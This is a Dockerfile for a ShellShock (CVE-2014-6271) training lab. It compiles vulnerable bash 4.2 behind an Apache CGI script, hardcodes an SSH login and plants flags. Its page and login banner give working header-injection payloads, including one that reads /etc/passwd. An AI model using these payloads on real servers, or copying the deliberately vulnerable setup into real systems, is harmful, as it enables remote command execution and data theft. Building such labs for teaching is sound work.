# LearnForge — ShellShock (CVE-2014-6271) Lab Image
# Dual-service: Apache (port 80) + OpenSSH (port 22)
# Students SSH in as "hacker" and use curl to craft HTTP requests against Apache.

FROM debian:bullseye-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    apache2 \
    curl \
    gcc \
    libc6-dev \
    make \
    wget \
    ca-certificates \
    openssh-server \
    procps \
    nano \
    && rm -rf /var/lib/apt/lists/*

# ── Download and compile vulnerable bash 4.2 ──────────────────
RUN cd /tmp && \
    wget -q https://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz && \
    tar xzf bash-4.2.tar.gz && \
    cd bash-4.2 && \
    ./configure --prefix=/opt/bash-4.2 && \
    make -j$(nproc) && \
    make install && \
    rm -rf /tmp/bash-4.2*

# Link vulnerable bash so CGI scripts use it
RUN ln -sf /opt/bash-4.2/bin/bash /usr/local/bin/bash-vuln

# ── Enable CGI module ─────────────────────────────────────────
RUN a2enmod cgid

# ── Configure Apache for CGI ──────────────────────────────────
RUN echo '\
<VirtualHost *:80>\n\
    DocumentRoot /var/www/html\n\
    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/\n\
    <Directory "/usr/lib/cgi-bin">\n\
        AllowOverride None\n\
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch\n\
        Require all granted\n\
    </Directory>\n\
    ErrorLog ${APACHE_LOG_DIR}/error.log\n\
    CustomLog ${APACHE_LOG_DIR}/access.log combined\n\
</VirtualHost>\n' > /etc/apache2/sites-available/000-default.conf

# ── Create the main web page ──────────────────────────────────
RUN echo '<!DOCTYPE html>\n\
<html><head><title>ShellShock Target</title>\n\
<style>\n\
  body { font-family: sans-serif; background: #1a1a2e; color: #e0e0e0; margin: 40px; }\n\
  h1 { color: #e94560; }\n\
  a { color: #0f3460; background: #e94560; padding: 8px 16px; border-radius: 4px; text-decoration: none; }\n\
  a:hover { background: #c23152; }\n\
  pre { background: #16213e; padding: 16px; border-radius: 4px; overflow-x: auto; }\n\
  .info { background: #16213e; padding: 16px; border-radius: 8px; margin: 16px 0; }\n\
</style></head>\n\
<body>\n\
  <h1>Welcome to the ShellShock Target Server</h1>\n\
  <div class="info">\n\
    <p>This server is running Apache with CGI enabled.</p>\n\
    <p>There is a CGI script available at: <code>/cgi-bin/vulnerable</code></p>\n\
  </div>\n\
  <h2>Try it</h2>\n\
  <p><a href="/cgi-bin/vulnerable">Visit CGI Endpoint</a></p>\n\
  <h2>Hint</h2>\n\
  <pre>curl -A \"() { :; }; echo; echo vulnerable\" http://&lt;target&gt;/cgi-bin/vulnerable</pre>\n\
</body></html>' > /var/www/html/index.html

# ── Create vulnerable CGI script ──────────────────────────────
RUN mkdir -p /usr/lib/cgi-bin && \
    echo '#!/usr/local/bin/bash-vuln\necho "Content-type: text/html"\necho ""\necho "<html><body>"\necho "<h1>CGI Script Output</h1>"\necho "<p>Hello from the CGI script!</p>"\necho "<p>Server time: $(date)</p>"\necho "<p>User: $(whoami)</p>"\necho "</body></html>"' > /usr/lib/cgi-bin/vulnerable && \
    chmod 755 /usr/lib/cgi-bin/vulnerable

# ── Create a flag for students to find ─────────────────────────
RUN echo "FLAG{shellshock_exploited_cve_2014_6271}" > /root/flag.txt && \
    chmod 600 /root/flag.txt

# Also create a hidden flag in a typical location
RUN echo "FLAG{cgi_rce_achieved}" > /var/www/flag.txt && \
    chmod 644 /var/www/flag.txt

# ── Set up SSH ────────────────────────────────────────────────
RUN useradd -m -s /bin/bash hacker && \
    echo "hacker:shellshock" | chpasswd && \
    mkdir -p /var/run/sshd

# SSH server config: allow password auth, no root login
RUN echo 'PermitRootLogin no' >> /etc/ssh/sshd_config && \
    echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && \
    echo 'AllowUsers hacker' >> /etc/ssh/sshd_config && \
    echo 'X11Forwarding no' >> /etc/ssh/sshd_config && \
    ssh-keygen -A

# ── MOTD with lab hints ───────────────────────────────────────
RUN printf 'ShellShock Lab (CVE-2014-6271)\n==============================\nApache is running on localhost:80\nCGI endpoint: http://localhost/cgi-bin/vulnerable\n\nQuick test:\n  curl -A "() { :; }; echo; echo vulnerable" http://localhost/cgi-bin/vulnerable\n\nExtract /etc/passwd:\n  curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/vulnerable\n\nRoot flag is at /root/flag.txt -- exploit it to read it!\n' > /etc/motd

# ── Startup script: run Apache then sshd ─────────────────────
RUN printf '#!/bin/bash\nset -e\napachectl start\nexec /usr/sbin/sshd -D\n' > /start.sh && \
    chmod +x /start.sh

EXPOSE 22 80

CMD ["/start.sh"]
